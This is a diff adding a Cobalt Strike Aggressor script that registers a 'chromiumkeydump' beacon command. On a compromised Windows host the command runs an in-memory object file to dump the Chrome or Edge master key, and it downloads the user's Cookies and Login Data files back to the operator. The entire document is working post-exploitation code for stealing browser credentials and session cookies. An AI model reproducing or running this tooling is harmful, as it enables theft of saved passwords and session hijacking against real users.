@@ -1,0 +1,59 @@
+alias chromiumkeydump {
+    $bid = $1;
+    $browser = $2;
+    $command = $3;
+
+    $arch = binfo($bid, "barch");
+    $username = split(" ", binfo($bid, "user"))[0];
+
+	if ($arch eq "x64") {
+        $handle = openf(script_resource("./bin/ChromiumKeyDump.x64.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+    } else {
+        $handle = openf(script_resource("./bin/ChromiumKeyDump.o"));
+        $data = readb($handle, -1);
+        closef($handle);
+    }
+    
+    if ($browser eq "chrome") {
+        $browser_type = 0;
+        $browser_path = "Google\\Chrome";
+    } else if ($browser eq "edge") {
+        $browser_type = 1;
+        $browser_path = "Microsoft\\Edge";
+    } else {
+        berror($bid, "Check parameters: help chromiumkeydump\n");
+        return;
+    }
+
+    $args = bof_pack($bid, "i", $browser_type);
+
+    if ($command eq "masterkey") {
+        btask($bid, "Tasked to dump ".uc($browser)." Masterkey");
+        beacon_inline_execute($bid, $data, "go", $args);
+    } else if ($command eq "cookies") {
+        btask($bid, "Tasked to download ".uc($browser)." Cookies file");
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Cookies");    
+    } else if ($command eq "logindata") {
+        btask($bid, "Tasked to download ".uc($browser)." LoginData file");
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Login Data");    
+    }else if ($command eq "all") {
+        btask($bid, "Tasked to dump ".uc($browser)." Masterkey and download Cookies/LoginData");
+        beacon_inline_execute($bid, $data, "go", $args);
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Cookies");
+        bdownload($bid,"c:\\Users\\".$username."\\AppData\\Local\\".$browser_path."\\User Data\\Default\\Login Data");  
+    } else {
+        berror($bid, "Check parameters: help chromiumkeydump\n");
+        return;
+    }
+}
+
+beacon_command_register("chromiumkeydump", "Dump Chrome/Edge Masterkey and download Cookies/LoginData", 
+"\nUsage: chromiumkeydump [edge|chrome] [argument(required)]\n
+                Arguments       Description
+                ---------       -----------
+                masterkey       Dump Masterkey
+                cookies         Download Chrome Cookies file
+                logindata       Download Chrome Login Data file
+                all             Dump Masterkey and download files\n");
